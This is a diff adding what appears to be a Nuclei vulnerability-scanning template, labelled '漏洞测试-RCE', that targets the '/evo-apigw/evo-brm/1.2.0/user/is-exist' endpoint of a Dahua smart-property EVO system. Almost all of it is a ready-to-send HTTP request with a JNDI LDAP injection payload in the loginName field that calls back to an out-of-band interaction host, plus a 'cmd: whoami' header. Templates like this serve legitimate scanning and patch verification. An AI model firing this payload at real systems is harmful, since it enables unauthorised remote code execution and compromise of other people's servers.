@@ -1,0 +1,32 @@
+id: dahuazhinengwuye-evo-apigw-rce
+
+info:
+  name: dahuazhinengwuye-evo-apigw-rce
+  author: HackTwo
+  severity: high
+
+  description: |
+    漏洞测试-RCE
+  reference:
+    - https://wx.zsxq.com/dweb2/index/group/88885811181452
+  tags: auto
+
+http:
+  - raw:
+      - |        
+        POST /evo-apigw/evo-brm/1.2.0/user/is-exist HTTP/1.1
+        Host: {{Hostname}}
+        cmd: whoami
+        Content-Type: application/json;charset=utf-8
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+        Connection: close
+        {"loginName":"${jndi:ldap://{{interactsh-url}}}"}
+
+
+    matchers:
+      - type: word
+        part: interactsh_protocol # Confirms the DNS Interaction
+        words:
+          - "dns"
